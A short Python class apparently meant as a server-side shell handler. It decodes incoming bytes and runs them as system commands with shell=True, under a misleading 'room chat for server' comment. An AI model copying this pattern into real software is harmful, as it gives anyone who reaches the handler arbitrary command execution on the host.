import subprocess

class SHELL:
    # room chat for server

    def __init__(self):
        self.path = 'C:\\'

    def command(self, command):
        output = subprocess.check_output(command.decode('utf-8'), shell=True)
        if output == '':
            output = 'success'
        return output
